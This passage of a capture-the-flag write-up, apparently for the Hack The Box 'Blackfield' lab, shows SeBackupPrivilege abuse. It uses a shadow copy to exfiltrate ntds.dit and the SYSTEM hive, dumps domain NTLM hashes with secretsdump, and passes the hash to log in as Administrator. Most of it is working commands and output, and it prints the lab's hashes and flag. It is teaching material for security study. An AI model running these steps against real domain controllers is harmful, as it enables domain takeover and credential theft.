Number of shadow copies listed: 1
-> expose %sidd% v:
-> %sidd% = {b6a808bd-2394-4e03-b06e-60f5580061c9}
**The shadow copy was successfully exposed as v:\.**
-> exec "C:\Windows\System32\cmd.exe" /C copy v:\windows\ntds\ntds.dit c:\temp\ntds.dit
diskshadow.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
        0 file(s) copied.
The command script returned failure exit code 1.
The command script failed.
**Evil-WinRM** PS C:\temp> 
```
The shadow copy was created successfully but it says that we can't copy the ntds.dit file.<br>
```shell
**Evil-WinRM** PS C:\temp> cd v:
**Evil-WinRM** PS v:\> cd Users/Administrator/Desktop
**Evil-WinRM** PS v:\Users\Administrator\Desktop> dir


    Directory: v:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-ar---        5/28/2020  10:09 AM             32 root.txt


**Evil-WinRM** PS v:\Users\Administrator\Desktop> type root.txt
Access to the path 'v:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : **PermissionDenied:** (v:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
**Evil-WinRM** PS v:\Users\Administrator\Desktop>

```
Since we have the SeBackupPrivilege we can go inside the Administrator folder but we can't download or read the Administrator files it is nicely explained in this github repository:<br>
[https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)<br>
[Download the required cmdlets](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)<br>
Now let's upload these dlls and get the ntds.dit file and the registry SYSTEM file on our machine so we can use secretsdump.py to retrieve the Administrator NTLM hash. First head back to c:\temp directory and then uplod the dlls.
```shell
**Evil-WinRM** PS C:\temp> upload /home/sid/Documents/resources/SeBackupPrivilegeCmdLets.dll
Info: Uploading /home/sid/Documents/resources/SeBackupPrivilegeCmdLets.dll to C:\temp\SeBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

**Evil-WinRM** PS C:\temp> upload /home/sid/Documents/resources/SeBackupPrivilegeUtils.dll
Info: Uploading /home/sid/Documents/resources/SeBackupPrivilegeUtils.dll to C:\temp\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

```
Let's import these, and like in the example in the github repo : Copy-FileSeBackupPrivilege .\report.pdf c:\temp\x.pdf -Overwrite<br>
we can copy the ntds.dit file into temp folder.
```shell
**Evil-WinRM** PS C:\temp> import-module .\SeBackupPrivilegeUtils.dll
**Evil-WinRM** PS C:\temp> import-module .\SeBackupPrivilegeCmdLets.dll
**Evil-WinRM** PS C:\temp> Copy-FileSebackupPrivilege v:\Windows\NTDS\ntds.dit C:\temp\sid.dit
**Evil-WinRM** PS C:\temp> download sid.dit
Info: Downloading C:\temp\sid.dit to sid.dit

Info: Download successful!
**Evil-WinRM** PS C:\temp> reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.

**Evil-WinRM** PS C:\temp> download system
Info: Downloading C:\temp\system to system

Info: Download successful!

```
Now that we have ntds.dit file and the system file let's use secrestsdump.py to get the Administrator NTLM hash.
```shell
sid@kali:~$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds sid.dit -system system -hashes lmhash:nthash LOCAL -output admin-hash
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[] Searching for pekList, be patient
[] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[] Reading and decrypting hashes from sid.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD840481:1112:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD622501:1113:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD787464:1114:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD163183:1115:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD869335:1116:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD319016:1117:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```
We can now login as Administrator.<br>
```shell
 sid@kali:~$ evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
 Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

**Evil-WinRM** PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
**Evil-WinRM** PS C:\Users\Administrator\Documents> cd ../Desktop
**Evil-WinRM** PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
**Evil-WinRM** PS C:\Users\Administrator\Desktop>
```
